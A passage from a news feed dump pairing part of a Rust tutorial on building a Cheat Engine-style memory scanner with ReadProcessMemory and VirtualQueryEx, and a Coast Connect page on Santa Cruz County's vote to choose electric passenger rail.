open=""><summary>Cheat Engine Tutorial: Step 2</summary> <blockquote><p>Now that you have opened the tutorial with Cheat Engine let's get on with the next step.</p><p>You can see at the bottom of this window is the text Health: xxx. Each time you click 'Hit me' your health gets decreased.</p><p>To get to the next step you have to find this value and change it to 1000</p><p>To find the value there are different ways, but I'll tell you about the easiest, 'Exact Value': First make sure value type is set to at least 2-bytes or 4-bytes. 1-byte will also work, but you'll run into an easy to fix problem when you've found the address and want to change it. The 8-byte may perhaps works if the bytes after the address are 0, but I wouldn't take the bet. Single, double, and the other scans just don't work, because they store the value in a different way.</p><p>When the value type is set correctly, make sure the scantype is set to 'Exact Value'. Then fill in the number your health is in the value box. And click 'First Scan'. After a while (if you have a extremely slow pc) the scan is done and the results are shown in the list on the left</p><p>If you find more than 1 address and you don't know for sure which address it is, click 'Hit me', fill in the new health value into the value box, and click 'Next Scan'. Repeat this until you're sure you've found it. (that includes that there's only 1 address in the list.....)</p><p>Now double click the address in the list on the left. This makes the address pop-up in the list at the bottom, showing you the current value. Double click the value, (or select it and press enter), and change the value to 1000.</p><p>If everything went ok the next button should become enabled, and you're ready for the next step.</p><p>Note: If you did anything wrong while scanning, click "New Scan" and repeat the scanning again. Also, try playing around with the value and click 'hit me'</p></blockquote></details><h2 id="our-first-scan">Our First Scan</h2><p>The Cheat Engine tutorial talks about "value types" and "scan types" like "exact value".</p><p>The <strong>value types</strong> will help us narrow down <em>what</em> we're looking for. For example, the integer type <code>i32</code> is represented in memory as 32 bits, or 4 bytes. However, <code>f32</code> is <em>also</em> represented by 4 bytes, and so is <code>u32</code>. Or perhaps the 4 bytes represent RGBA values of a color! So any 4 bytes in memory can be interpreted in many ways, and it's up to us to decide which way we interpret the bytes in.</p><p>When programming, numbers which are 32-bit wide are common, as they're a good (and fast) size to work with. Scanning for this type is often a good bet. For positive numbers, <code>i32</code> is represented the same as <code>u32</code> in memory, so even if the value turns out to not be signed, the scan is likely to work. Focusing on <code>i32</code> will save us from scanning for <code>f32</code> or even other types, like interpreting 8 bytes for <code>i64</code>, <code>f64</code>, or less bytes like <code>i16</code>.</p><p>The <strong>scan types</strong> will help us narrow down <em>how</em> we're looking for a value. Scanning for an exact value means what you think it does: interpret all 4 bytes in the process' memory as our value type, and check if they exactly match our value. This will often yield a lot of candidates, but it will be enough to get us started. Variations of the exact scan include checking for all values below a threshold, above, in between, or even just‚Ä¶ unknown.</p><p>What's the point of scanning for unknown values if <em>everything</em> in memory is unknown? Sometimes you don't have a concrete value. Maybe your health pool is a bar and it nevers tell you how much health you actually have, just a visual indicator of your percentage left, even if the health is not stored as a percentage. As we will find later on, scanning for unknown values is more useful than it might appear at first.</p><p>We can access the memory of our own program by guessing random pointers and trying to read from them. But Windows isolates the memory of each program, so no pointer we could ever guess will let us read from the memory of another process. Luckily for us, searching for "read process memory winapi" leads us to the <a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory"><code>ReadProcessMemory</code></a> function. Spot on.</p><pre><code data-lang="rust">pub fn read_memory(&amp;self, addr: usize, n: usize) -&gt; io::Result&lt;Vec&lt;u8&gt;&gt; {
    todo!()
}
</code></pre><p>Much like trying to dereference a pointer pointing to released memory or even null, reading from an arbitrary address can fail for the same reasons (and more). We will want to signal this with <code>io::Result</code>. It's funny to note that, even though we're doing something that seems wildly unsafe (reading arbitrary memory, even if the other process is mutating it at the same time), the function is perfectly safe. If we cannot read something, it will return <code>Err</code>, but if it succeeds, it has taken a snapshot of the memory of the process, and the returned value will be correctly initialized.</p><p>The function will be defined inside our <code>impl Process</code>, since it conveniently holds an open handle to the process in question. It takes <code>&amp;self</code>, because we do not need to mutate anything in the <code>Process</code> instance. After adding the <code>memoryapi</code> feature to <code>Cargo.toml</code>, we can perform the call:</p><pre><code data-lang="rust">let mut buffer = Vec::&lt;u8&gt;::with_capacity(n);
let mut read = 0;

// SAFETY: the buffer points to valid memory, and the buffer size is correctly set.
if unsafe {
    winapi::um::memoryapi::ReadProcessMemory(
        self.handle.as_ptr(),
        addr as *const _,
        buffer.as_mut_ptr().cast(),
        buffer.capacity(),
        &amp;mut read,
    )
} == FALSE
{
    Err(io::Error::last_os_error())
} else {
    // SAFETY: the call succeeded and `read` contains the amount of bytes written.
    unsafe { buffer.set_len(read as usize) };
    Ok(buffer)
}
</code></pre><p>Great! But the address space is somewhat large. 64 bits large. Eighteen quintillion, four hundred and forty-six quadrillion, seven hundred and forty-four trillion, seventy-three billion, seven hundred and nine million, five hundred and fifty-one thousand, six hundred and sixteen<sup><a href="#1">1</a></sup> large. You gave up reading that, didn't you? Anyway, 18'446'744'073'709'551'616 is a <em>big</em> number.</p><p>I am not willing to wait for the program to scan over so many values. I don't even have 16 <a href="https://en.wikipedia.org/wiki/Orders_of_magnitude_(data)">exbibytes</a> of RAM installed on my laptop yet<sup><a href="#2">2</a></sup>! What's up with that?</p><h2 id="memory-regions">Memory regions</h2><p>The program does not actually have all that memory allocated (surprise!). Random-guessing an address is extremely likely to point out to invalid memory. Reading from the start of the address space all the way to the end would not be any better. And we <strong>need</strong> to do better.</p><p>We need to query for the memory regions allocated to the program. For this purpose we can use <a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualqueryex"><code>VirtualQueryEx</code></a>.</p><blockquote><p>Retrieves information about a range of pages within the virtual address space of a specified process.</p></blockquote><p>We have enumerated things before, and this function is not all that different.</p><pre><code data-lang="rust">fn memory_regions(&amp;self) -&gt; io::Result&lt;winapi::um::winnt::MEMORY_BASIC_INFORMATION&gt; {
    let mut info = MaybeUninit::uninit();

    // SAFETY: the info structure points to valid memory.
    let written = unsafe {
        winapi::um::memoryapi::VirtualQueryEx(
            self.handle.as_ptr(),
            std::ptr::null(),
            info.as_mut_ptr(),
            mem::size_of::&lt;winapi::um::winnt::MEMORY_BASIC_INFORMATION&gt;(),
        )
    };
    if written == 0 {
        Err(io::Error::last_os_error())
    } else {
        // SAFETY: a non-zero amount was written to the structure
        Ok(unsafe { info.assume_init() })
    }
}
</code></pre><p>We start with a base address of zero<sup><a href="#3">3</a></sup> (<code>std::ptr::null()</code>), and ask the function to tell us what's in there. Let's try it out, with the <code>impl-debug</code> crate feature in <code>Cargo.toml</code>:</p><pre><code data-lang="rust">dbg!(process.memory_regions());
</code></pre><pre><code>&gt;cargo run
Compiling memo v0.1.0

error[E0277]: `winapi::um::winnt::MEMORY_BASIC_INFORMATION` doesn't implement `std::fmt::Debug`
   --&gt; src\main.rs:185:5
    |
185 |     dbg!(process.memory_regions());
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ `winapi::um::winnt::MEMORY_BASIC_INFORMATION` cannot be formatted using `{:?}` because it doesn't implement `std::fmt::Debug`
</code></pre><p>That's annoying. It seems not everything has an <code>impl std::fmt::Debug</code>, and <a href="https://github.com/retep998/winapi-rs/issues/548#issuecomment-355278090">you're supposed to send a PR</a> if you want it to have debug, even if the <code>impl-debug</code> feature is set. I'm surprised they don't auto-generate all of this and have to rely on manually adding <code>Debug</code> as needed? Oh well, let's get rid of the feature and print it out ourselves:</p><pre><code>eprintln!(
    ‚Ä¶</code></pre></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://lonami.dev/blog/woce-2/">https://lonami.dev/blog/woce-2/</a></em></p>]]>
            </description>
            <link>https://lonami.dev/blog/woce-2/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26197828</guid>
            <pubDate>Fri, 19 Feb 2021 20:45:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Passenger Rail Chosen to Connect Watsonville and Santa Cruz]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26197587">thread link</a>) | @bogidon
<br/>
February 19, 2021 | https://coastconnect.org/passenger-rail-chosen-to-connect-watsonville-and-santa-cruz/ | <a href="https://web.archive.org/web/*/https://coastconnect.org/passenger-rail-chosen-to-connect-watsonville-and-santa-cruz/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main" role="main">

						<div data-elementor-type="single" data-elementor-id="2042" data-elementor-settings="[]">
		<div>
					<section data-particle_enable="false" data-particle-mobile-disabled="false" data-id="6ea784e" data-element_type="section" data-settings="{&quot;stretch_section&quot;:&quot;section-stretched&quot;}">
						<div>
							<div>
					<div data-id="2cb7618" data-element_type="column">
			<div>
							<div>
						
				
				<div data-id="4eeb683" data-element_type="widget" data-widget_type="theme-post-featured-image.default">
				<div>
					<p><a href="https://youtu.be/1pYVCC5jG9w">
							<img width="5428" height="2855" src="https://i2.wp.com/coastconnect.org/wp-content/uploads/2021/02/RedTramCropped.jpeg?fit=5428%2C2855&amp;ssl=1&amp;is-pending-load=1" alt="Modern red tram on city street" loading="lazy" data-attachment-id="5336" data-permalink="https://coastconnect.org/passenger-rail-chosen-to-connect-watsonville-and-santa-cruz/casablanca-tramway-2/" data-orig-file="https://i2.wp.com/coastconnect.org/wp-content/uploads/2021/02/RedTramCropped.jpeg?fit=5428%2C2855&amp;ssl=1" data-orig-size="5428,2855" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;4&quot;,&quot;credit&quot;:&quot;Morocko - stock.adobe.com&quot;,&quot;camera&quot;:&quot;DSC-RX100M2&quot;,&quot;caption&quot;:&quot;a fast moving tram in the streets of casablanca&quot;,&quot;created_timestamp&quot;:&quot;1474129682&quot;,&quot;copyright&quot;:&quot;\u00a9Morocko - stock.adobe.com&quot;,&quot;focal_length&quot;:&quot;10.4&quot;,&quot;iso&quot;:&quot;160&quot;,&quot;shutter_speed&quot;:&quot;0.004&quot;,&quot;title&quot;:&quot;Casablanca tramway&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="Casablanca tramway" data-image-description="" data-medium-file="https://i2.wp.com/coastconnect.org/wp-content/uploads/2021/02/RedTramCropped.jpeg?fit=750%2C510&amp;ssl=1" data-large-file="https://i2.wp.com/coastconnect.org/wp-content/uploads/2021/02/RedTramCropped.jpeg?fit=1024%2C539&amp;ssl=1" data-lazy-srcset="https://i2.wp.com/coastconnect.org/wp-content/uploads/2021/02/RedTramCropped.jpeg?w=5428&amp;ssl=1 5428w, https://i2.wp.com/coastconnect.org/wp-content/uploads/2021/02/RedTramCropped.jpeg?resize=1024%2C539&amp;ssl=1 1024w, https://i2.wp.com/coastconnect.org/wp-content/uploads/2021/02/RedTramCropped.jpeg?resize=768%2C404&amp;ssl=1 768w, https://i2.wp.com/coastconnect.org/wp-content/uploads/2021/02/RedTramCropped.jpeg?resize=1536%2C808&amp;ssl=1 1536w, https://i2.wp.com/coastconnect.org/wp-content/uploads/2021/02/RedTramCropped.jpeg?resize=2048%2C1077&amp;ssl=1 2048w, https://i2.wp.com/coastconnect.org/wp-content/uploads/2021/02/RedTramCropped.jpeg?w=2400&amp;ssl=1 2400w, https://i2.wp.com/coastconnect.org/wp-content/uploads/2021/02/RedTramCropped.jpeg?w=3600&amp;ssl=1 3600w" data-lazy-sizes="(max-width: 5428px) 100vw, 5428px" data-lazy-src="https://i2.wp.com/coastconnect.org/wp-content/uploads/2021/02/RedTramCropped.jpeg?fit=5428%2C2855&amp;ssl=1&amp;is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">								</a>
											</p>
				</div>
				</div>
						</div>
					</div>
		</div>
								</div>
					</div>
		</section>
				<section data-particle_enable="false" data-particle-mobile-disabled="false" data-id="7696090" data-element_type="section" data-settings="{&quot;stretch_section&quot;:&quot;section-stretched&quot;}">
						<div>
							<div>
					
				<div data-id="1fec587" data-element_type="column">
			<div>
							<div>
						<div data-id="4a5cd85" data-element_type="widget" data-widget_type="theme-post-content.default">
				<div>
					<div data-elementor-type="wp-post" data-elementor-id="5299" data-elementor-settings="[]">
						<div>
							<div>
							<section data-particle_enable="false" data-particle-mobile-disabled="false" data-id="3e4b6f2e" data-element_type="section">
						<div>
							<div>
					<div data-id="20db642c" data-element_type="column">
			<div>
							<div>
						<div data-id="5eedc1e0" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div>
<p><strong>The movement to bring quality public transit to our county just achieved a major milestone:</strong></p>
<p>Electric Passenger Rail is now the official Locally Preferred Alternative (LPA) for service along the rail corridor between Watsonville and Santa Cruz! At the February Regional Transportation Commission (RTC) meeting, the commissioners chose rail with a <strong>resounding 9 to 3 vote</strong>.&nbsp;</p>
</div>
				</div>
				</div>
				<div data-id="83e0ff4" data-element_type="widget" data-widget_type="heading.default">
				<p>
			<h2>What is the LPA and Why does it Matter?</h2>		</p>
				</div>
				<div data-id="f017835" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p><span>A Locally Preferred Alternative is a formal designated choice of a transit mode, such as bus or rail, for a given project. Having an officially approved LPA will allow us to apply for state and federal grants to pay for the new transit system.&nbsp;</span></p>
<p><span>It‚Äôs also important to know that different transit modes have different sources of funding (sometimes referred to as funding buckets). The </span><a href="https://dot.ca.gov/programs/rail-and-mass-transportation/california-state-rail-plan" target="_blank" rel="noopener"><span><span>State Rail Plan</span></span></a><span> is California‚Äôs guide to reduce transportation GHG emissions by switching from highway expansion to rail expansion. The plan includes dramatically expanding rail funding in order to implement a robust regional rail network. In other words, there‚Äôs now a big funding bucket for rail in California.&nbsp;</span></p>
<p><span>Because the RTC commissioners chose rail for our LPA, our rail line will continue to be included in the State Rail Plan and stay eligible to apply for rail funds. It appears the federal government is making the same shift towards increased rail funding under the Biden Administration. As an added bonus, once METRO becomes part of our new rail transportation system, it will also be eligible for funding from the rail bucket.&nbsp;</span></p></div>
				</div>
				</div>
				<div data-id="3650f8f" data-element_type="widget" data-widget_type="heading.default">
				<p>
			<h2>Community and Agency Support for the Rail LPA</h2>		</p>
				</div>
				<div data-id="774eb4e" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p><span>Throughout 2020 and early 2021, the RTC staff and consultants were engaged in the Transit Corridor Alternatives Analysis (TCAA) study to determine which transit mode would be best for our rail corridor. The study used a triple bottom line analysis, considering Equity, Economy, and the Environment. The final study outcome recommended Electric Passenger Rail as the best alternative.</span></p>
<h4><b>Community Outreach Efforts and Results</b></h4>
<p><span>Public opinion was part of the TCAA study, and Friends of the Rail &amp; Trail volunteers worked hard to encourage the public to participate.&nbsp;</span></p>
<ul>
<li aria-level="1"><span>We asked people to submit comments, write emails, and phone commissioners. In the final count, about 80% of all public comments to the RTC expressed support for passenger rail.&nbsp;</span></li>
<li aria-level="1"><span>We asked people to participate in three RTC open-house events, including online surveys. In the last survey, 75% of the almost 1,000 participants affirmed the choice of electric passenger rail.&nbsp;</span></li>
<li aria-level="1"><span>Lastly, we helped members of the public access the multiple, sometimes-grueling remote RTC meetings, and many of our supporters offered public testimony. Speakers in support of rail outnumbered opponents at least 2 to 1 at every public hearing.</span></li>
</ul>
<h4><b>Government and Agency Input</b></h4>
<p><span>Many government agencies sent letters of support for rail to the RTC, including the Caltrans Division of Rail and Mass Transportation, the California Coastal Commission, Santa Cruz City Council, Watsonville City Council, the Transportation Agency for Monterey County, the RTC Interagency Technical Advisory Committee, and the two RTC citizen advisory committees related to equity and accessibility: the Bicycle Advisory Committee and the Elderly &amp; Disabled Transportation Advisory Committee.&nbsp;</span></p>
<h4><b>Nonprofit Organization Input</b></h4>
<p><span>Many community organizations also sent letters of support for rail to the RTC, including the local chapter of the Sierra Club, Bike Santa Cruz County, Regeneraci√≥n Pajaro Valley, the Campaign for Sustainable Transportation, and Ecology Action.</span></p></div>
				</div>
				</div>
				<div data-id="c7e44ab" data-element_type="widget" data-widget_type="heading.default">
				<p>
			<h2>Was the Choice for Rail Certain?</h2>		</p>
				</div>
				<div data-id="e4bfa3d" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p><span>Despite all this community support, and the fact that the Transit Corridor Alternatives Analysis study recommended Electric Passenger Rail as the LPA, the outcome of the February vote was not a given. It was only after a lively debate that the RTC commissioners voted 9 to 3 to accept the study‚Äôs recommendation for rail.</span></p>
<p><span>Our thanks go to Chair Aurellio Gonzalez, Commissioners Greg Caput, Eduardo Montesino, Sandy Brown and Mike Rotkin, and to Commissioner alternates Donna Meyers, Virginia Johnson, Patrick Mulhearn, and Andy Schiffrin. They showed a commitment to the data-driven public process that selected rail as the best option for Santa Cruz County.</span></p></div>
				</div>
				</div>
				<div data-id="21abf34" data-element_type="widget" data-widget_type="heading.default">
				<p>
			<h2>What Does this Mean? What is Next?</h2>		</p>
				</div>
				<div data-id="764cdfd" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p><span>First, the choice of rail for the LPA means that construction on the Rail Trail can continue without delay!</span></p>
<p><span>On the transit front, the RTC staff will now prepare a Business Plan outlining the steps needed to implement a county-wide transit network. Passenger rail with synchronized METRO bus connections will be the foundation of this new transit system. The TCAA made it overwhelmingly clear that this rail-based system far outperforms any other alternative. Now that the RTC has officially recognized this fact, we can move on to refining the costs, the potential funding streams, and the construction schedules for all the parts of the network.&nbsp;</span></p>
<p><span>The trail only / rail never crowd is not going away. Until the Rail Trail is finished and passenger rail is running, we will need your continued support. If you have not already done so, please follow us on <a href="https://www.facebook.com/CoastConnectSCC" target="_blank" rel="noopener">social media</a>, and <a href="https://secure.everyaction.com/7awHNSEYGU6AHLOdNeBlrw2" target="_blank" rel="noopener">endorse the Coast Connect vision</a>.</span></p></div>
				</div>
				</div>
				
				<div data-id="e9000eb" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p><span>This was a decision with multi-generational impacts on equity, the environment, and our quality of life. By choosing rail for the LPA, the RTC preserved a critical opportunity and made progress towards a future where Santa Cruz County becomes a better place for everyone who lives, works, and plays here. Rail and Trail supporters sent emails to the commission, attended the public meetings, and spoke out in favor of rail at these meetings. Your actions provided the support that the commissioners needed in order to vote for such a visionary project. They couldn‚Äôt have done it without you. Again and again, you really came through when it mattered. That is what friends do!</span></p>
				</div>
				</div>
						</div>
					</div>
		</div>
								</div>
					</div>
		</section>
				<section data-particle_enable="false" data-particle-mobile-disabled="false" data-id="67ba6ff" data-element_type="section">
						
		</section>
						</div>
						</div>
					</div>
				</div>
				</div>
				
						</div>
					</div>
		</div>
								</div>
					</div>
		</section>
				<section data-particle_enable="false" data-particle-mobile-disabled="false" data-id="6842ca4" data-element_type="section">
						<div>
							<div>
					
				<div data-id="e201c39" data-element_type="column">
			<div>
							<div>
						<div data-id="55f9779" data-element_type="widget" id="post-grid" data-settings="{&quot;eael_post_grid_columns&quot;:&quot;eael-col-2&quot;,&quot;eael_post_grid_columns_tablet&quot;:&quot;eael-col-2&quot;,&quot;eael_post_grid_columns_mobile&quot;:&quot;eael-col-1&quot;}" data-widget_type="eael-post-grid.default">
				<div>
			<div id="eael-post-grid-55f9779">
            <div data-layout-mode="masonry"><article data-id="5299">
        <div>
            <div><div><p><img src="https://i2.wp.com/coastconnect.org/wp-content/uploads/2021/02/RedTramCropped.jpeg?fit=5428%2C2855&amp;ssl=1" alt="Modern red tram on city street">
                            </p></div></div>
        </div>
    </article><article data-id="5266">
        <div>
            <div><div><p><img src="https://i2.wp.com/coastconnect.org/wp-content/uploads/2021/02/Seg18Finished.jpeg?fit=1280%2C960&amp;ssl=1" alt="Finished Segment 18 image, photo by Murray Fontes">
                            </p></div></div>
        </div>
    </article></div>
            
        </div>            
        		</div>
				</div>
						</div>
					</div>
		</div>
								</div>
					</div>
		</section>
				<section data-particle_enable="false" data-particle-mobile-disabled="false" data-id="79aafbf" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;,&quot;stretch_section&quot;:&quot;section-stretched&quot;}">
						<div>
							<div>
					<div data-id="52542dde" data-element_type="column">
			<div>
							<div>
						<div data-id="1eb1dc0a" data-element_type="widget" data-widget_type="image.default">
				<div>
					<p><a href="https://www.coastconnect.org/">
							<img width="400" height="121" src="https://i2.wp.com/coastconnect.org/wp-content/uploads/2020/06/CoastConnect-logo-primary.png?fit=400%2C121&amp;ssl=1&amp;is-pending-load=1" alt="" loading="lazy" data-attachment-id="2571" data-permalink="https://coastconnect.org/our-vision/coastconnect-logo-primary-3/" data-orig-file="https://i2.wp.com/coastconnect.org/wp-content/uploads/2020/06/CoastConnect-logo-primary.png?fit=400%2C121&amp;ssl=1" data-orig-size="400,121" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="CoastConnect-logo-primary" data-image-description="" data-medium-file="https://i2.wp.com/coastconnect.org/wp-content/uploads/2020/06/CoastConnect-logo-primary.png?fit=400%2C121&amp;ssl=1" data-large-file="https://i2.wp.com/coastconnect.org/wp-content/uploads/2020/06/CoastConnect-logo-primary.png?fit=400%2C121&amp;ssl=1" data-lazy-src="https://i2.wp.com/coastconnect.org/wp-content/uploads/2020/06/CoastConnect-logo-primary.png?fit=400%2C121&amp;ssl=1&amp;is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">								</a>
											</p>
				</div>
				</div>
				
						</div>
					</div>
		</div>
				<div data-id="153f3bf4" data-element_type="column">
			<div>
							<div>
						
				<div data-id="6230f6ce" data-element_type="widget" id="footer-text" data-widget_type="text-editor.default">
				<div>
					<p>Sign up here to receive news, important information for getting involved, and updates on our progress</p>
				</div>
				</div>
				
						</div>
					</div>
		</div>
				
				<div data-id="2654187c" data-element_type="column">
			<div>
							<div>
						<section data-particle_enable="false" data-particle-mobile-disabled="false" data-id="5e60cd6" data-element_type="section">
						<div>
							<div>
					
				<div data-id="6f01c084" data-element_type="column">
			<div>
							<div>
						<div data-id="2859319a" data-element_type="widget" data-widget_type="image.default">
				<div>
					<p><a href="https://www.railandtrail.org/">
							<img width="200" height="69" src="https://i0.wp.com/coastconnect.org/wp-content/uploads/2020/04/fortlogowhite-resized-1.png?fit=200%2C69&amp;ssl=1&amp;is-pending-load=1" alt="FORT Logo" loading="lazy" data-attachment-id="967" data-permalink="https://coastconnect.org/?attachment_id=967" data-orig-file="https://i0.wp.com/coastconnect.org/wp-content/uploads/2020/04/fortlogowhite-resized-1.png?fit=200%2C69&amp;ssl=1" data-orig-size="200,69" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="fortlogowhite-resized" data-image-description="<p>FORT Logo</p>
" data-medium-file="https://i0.wp.com/coastconnect.org/wp-content/uploads/2020/04/fortlogowhite-resized-1.png?fit=200%2C69&amp;ssl=1" data-large-file="https://i0.wp.com/coastconnect.org/wp-content/uploads/2020/04/fortlogowhite-resized-1.png?fit=200%2C69&amp;ssl=1" data-lazy-src="https://i0.wp.com/coastconnect.org/wp-content/uploads/2020/04/fortlogowhite-resized-1.png?fit=200%2C69&amp;ssl=1&amp;is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">								</a>
											</p>
				</div>
				</div>
						</div>
					</div>
		</div>
								</div>
					</div>
		</section>
				
						</div>
					</div>
		</div>
								</div>
					</div>
		</section>
				<section data-particle_enable="false" data-particle-mobile-disabled="false" data-id="59b57677" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;,&quot;stretch_section&quot;:&quot;section-stretched&quot;}">
						<div>
							<div>
					<div data-id="7e4669d3" data-element_type="column">
			<div>
							<div>
						<div data-id="4ff0f29" data-element_type="widget" data-widget_type="image.default">
				<div>
					<p><a href="https://www.coastconnect.org/">
							<img width="400" height="121" src="https://i2.wp.com/coastconnect.org/wp-content/uploads/2020/06/CoastConnect-logo-primary.png?fit=400%2C121&amp;ssl=1&amp;is-pending-load=1" alt="" loading="lazy" data-attachment-id="2571" data-permalink="https://coastconnect.org/our-vision/coastconnect-logo-primary-3/" data-orig-file="https://i2.wp.com/coastconnect.org/wp-content/uploads/2020/06/CoastConnect-logo-primary.png?fit=400%2C121&amp;ssl=1" data-orig-size="400,121" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="CoastConnect-logo-primary" data-image-description="" data-medium-file="https://i2.wp.com/coastconnect.org/wp-content/uploads/2020/06/CoastConnect-logo-primary.png?fit=400%2C121&amp;ssl=1" data-large-file="https://i2.wp.com/coastconnect.org/wp-content/uploads/2020/06/CoastConnect-logo-primary.png?fit=400%2C121&amp;ssl=1" data-lazy-src="https://i2.wp.com/coastconnect.org/wp-content/uploads/2020/06/CoastConnect-logo-primary.png?fit=400%2C121&amp;ssl=1&amp;is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">								</a>
											</p>
				</div>
				</div>
				
				
						</div>
					</div>
		</div>
				<div data-id="21b0835c" data-element_type="column">
			<div>
							<div>
						<section data-particle_enable="false" data-particle-mobile-disabled="false" data-id="23ce30b0" data-element_type="section">
						<div>
							<div>
					
				<div data-id="3ebb7064" data-element_type="column">
			<div>
							<div>
						<div data-id="57f8ddcc" data-element_type="widget" data-widget_type="image.default">
				<div>
					<p><a href="https://www.railandtrail.org/">
							<img width="200" height="69" src="https://i0.wp.com/coastconnect.org/wp-content/uploads/2020/04/fortlogowhite-resized-1.png?fit=200%2C69&amp;ssl=1&amp;is-pending-load=1" alt="FORT Logo" loading="lazy" data-attachment-id="967" data-permalink="https://coastconnect.org/?attachment_id=967" data-orig-file="https://i0.wp.com/coastconnect.org/wp-content/uploads/2020/04/fortlogowhite-resized-1.png?fit=200%2C69&amp;ssl=1" data-orig-size="200,69" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="fortlogowhite-resized" data-image-description="<p>FORT Logo</p>
" data-medium-file="https://i0.wp.com/coastconnect.org/wp-content/uploads/2020/04/fortlogowhite-resized-1.png?fit=200%2C69&amp;ssl=1" data-large-file="https://i0.wp.com/coastconnect.org/wp-content/uploads/2020/04/fortlogowhite-resized-1.png?fit=200%2C69&amp;ssl=1" data-lazy-src="https://i0.wp.com/coastconnect.org/wp-content/uploads/2020/04/fortlogowhite-resized-1.png?fit=200%2C69&amp;ssl=1&amp;is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">								</a>
											</p>
				</div>
				</div>
						</div>
					</div>
		</div>
								</div>
					</div>
		</section>
				
				<div data-id="4474fb6b" data-element_type="widget" id="footer-text" data-widget_type="text-editor.default">
				<div>
					<p>Sign up here to receive news, important information for getting involved, and updates on our progress</p>
				</div>
				</div>
				
				
						</div>
					</div>
		</div>
								</div>
					</div>
		</section>
				<section data-particle_enable="false" data-particle-mobile-disabled="false" data-id="330889a2" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;,&quot;stretch_section&quot;:&quot;section-stretched&quot;}">
						<div>
							<div>
					
				<div data-id="660f7de3" data-element_type="column">
			<div>
							<div>
						
				<div data-id="2b887957" data-element_type="widget" id="footer-text" data-widget_type="text-editor.default">
				<div>
					<p>Sign up here to receive news, important information for getting involved, and updates on our progress</p>
				</div>
				</div>
				
						</div>
					</div>
		</div>
				<div data-id="3bdebc1d" data-element_type="column">
			<div>
							<div>
						
				<div data-id="642714ab" data-element_type="widget" data-widget_type="image.default">
				<div>
					<p><a href="https://www.coastconnect.org/">
